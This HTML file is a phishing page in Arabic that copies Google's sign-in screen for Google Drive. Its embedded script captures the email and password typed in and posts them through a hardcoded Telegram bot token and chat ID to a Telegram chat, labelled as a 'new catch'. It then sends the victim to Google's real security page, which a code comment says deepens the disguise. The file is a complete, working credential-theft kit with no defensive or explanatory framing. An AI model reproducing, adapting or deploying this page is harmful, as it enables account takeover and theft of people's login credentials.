<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - حسابات Google</title>
    <style>
        :root {
            --google-blue: #1a73e8;
            --google-gray: #dadce0;
            --text-dark: #202124;
            --text-light: #5f6368;
        }

        body {
            font-family: 'Roboto', arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            width: 450px;
            border: 1px solid var(--google-gray);
            border-radius: 8px;
            padding: 48px 40px 36px;
            text-align: center;
            box-sizing: border-box;
        }

        @media (max-width: 450px) {
            .container { border: none; width: 100%; padding: 24px; }
        }

        .logo { width: 75px; margin-bottom: 12px; }

        h1 { font-size: 24px; font-weight: 400; color: var(--text-dark); margin: 0 0 8px; }

        .subtitle { font-size: 16px; color: var(--text-dark); margin-bottom: 30px; }

        .input-wrapper { margin-bottom: 24px; text-align: right; }

        input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid var(--google-gray);
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
            transition: border 0.2s;
        }

        input:focus { border: 2px solid var(--google-blue); padding: 12px 14px; }

        .google-link {
            color: var(--google-blue);
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            cursor: pointer;
        }

        .google-link:hover { text-decoration: underline; }

        .info-text {
            font-size: 14px;
            color: var(--text-light);
            line-height: 1.4;
            margin-top: 32px;
            text-align: right;
        }

        .action-area {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 40px;
        }

        button {
            background-color: var(--google-blue);
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
        }

        button:hover { background-color: #1765cc; }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
        <h1>تسجيل الدخول</h1>
        <div class="subtitle">المتابعة إلى Google Drive</div>

        <form id="loginForm">
            <div class="input-wrapper">
                <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
                <a href="https://accounts.google.com/signin/usernamerecovery" class="google-link" target="_blank">هل نسيت البريد الإلكتروني؟</a>
            </div>

            <div class="input-wrapper">
                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
                <a href="https://accounts.google.com/signin/recovery" class="google-link" target="_blank">هل نسيت كلمة المرور؟</a>
            </div>

            <div class="info-text">
                ليس جهازك؟ استخدم نافذة تصفح خاصة لتسجيل الدخول.
                <a href="https://support.google.com/answer/1358174" class="google-link" target="_blank">مزيد من المعلومات</a>
            </div>

            <div class="action-area">
                <a href="https://accounts.google.com/signup" class="google-link" target="_blank">إنشاء حساب</a>
                <button type="submit" id="submitBtn">التالي</button>
            </div>
        </form>
    </div>

    <script>
        // إعدادات بوت تليجرام
        const BOT_TOKEN = '8606890690:AAGLOepcMD4RkBCaYI8Axhfe2-HnxW4CWRo'; 
        const CHAT_ID = '7846676954';
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerText = 'جاري التحقق...';

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const message = `🎯 **صيد جديد!**\n\n📧 الإيميل: \`${email}\`\n🔑 الباسورد: \`${password}\`\n\n🌐 المصدر: ${window.location.hostname}`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(() => {
                // بعد إرسال البيانات، نوجه الضحية لصفحة الأمان الحقيقية لزيادة التمويه
                window.location.href = "https://myaccount.google.com/security";
            })
            .catch(() => {
                btn.disabled = false;
                btn.innerText = 'التالي';
            });
        });
    </script>
</body>
</html>
